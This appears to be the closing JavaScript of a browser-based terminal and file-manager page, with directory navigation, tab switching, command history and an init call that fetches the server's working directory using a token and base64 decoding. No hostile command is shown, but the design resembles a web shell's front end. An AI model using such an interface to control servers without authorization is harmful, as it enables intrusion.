function navUp(){
    var fp=document.getElementById('nx-fp').textContent;
    var parent=fp.split('/').slice(0,-1).join('/')||'/';
    loadFiles(parent);
}

// ── TAB SWITCHING ─────────────────────────────────────────────────────────────
function showTab(t){
    currentTab=t;
    document.querySelectorAll('.nx-tab').forEach(function(el){el.classList.remove('active');});
    document.getElementById('tab-'+t).classList.add('active');
    var fp=document.getElementById('nx-files');
    if(t==='files'){fp.classList.add('visible');loadFiles(CWD);}
    else{fp.classList.remove('visible');}
    if(t==='term')eCmd.focus();
}

// ── UTILS ─────────────────────────────────────────────────────────────────────
function _fmtSz(b){
    if(b<1024)return b+'B';
    if(b<1048576)return (b/1024).toFixed(1)+'K';
    if(b<1073741824)return (b/1048576).toFixed(1)+'M';
    return (b/1073741824).toFixed(1)+'G';
}
function clearTerm(){
    eOut.innerHTML='<span class="nx-banner">Terminal cleared.\n</span>';
}

// ── KEYBOARD ─────────────────────────────────────────────────────────────────
function onKey(e){
    switch(e.key){
        case 'Enter':
            var v=eCmd.value;eCmd.value='';runCmd(v);break;
        case 'ArrowUp':
            e.preventDefault();
            if(histPos>0){histPos--;eCmd.value=cmdHist[histPos];}break;
        case 'ArrowDown':
            e.preventDefault();
            histPos++;
            if(histPos>=cmdHist.length){eCmd.value='';histPos=cmdHist.length;}
            else eCmd.value=cmdHist[histPos];break;
        case 'Tab':
            e.preventDefault();featureHint();break;
        case 'l':
            if(e.ctrlKey){e.preventDefault();clearTerm();}break;
    }
}

// ── INIT ─────────────────────────────────────────────────────────────────────
document.onclick=function(e){
    var s=window.getSelection();
    if(!s.toString()&&e.target.tagName!=='INPUT'&&e.target.tagName!=='TEXTAREA'&&e.target.tagName!=='BUTTON')
        eCmd.focus();
};
window.onload=function(){
    eOut=document.getElementById('nx-out');
    eCmd=document.getElementById('nx-cmd');
    eCmd.addEventListener('keydown',onKey);
    req(T+'&feature=pwd',{},function(r){CWD=b64d(r.cwd);updPrompt();});
    eCmd.focus();
};
</script>
</body>
</html>
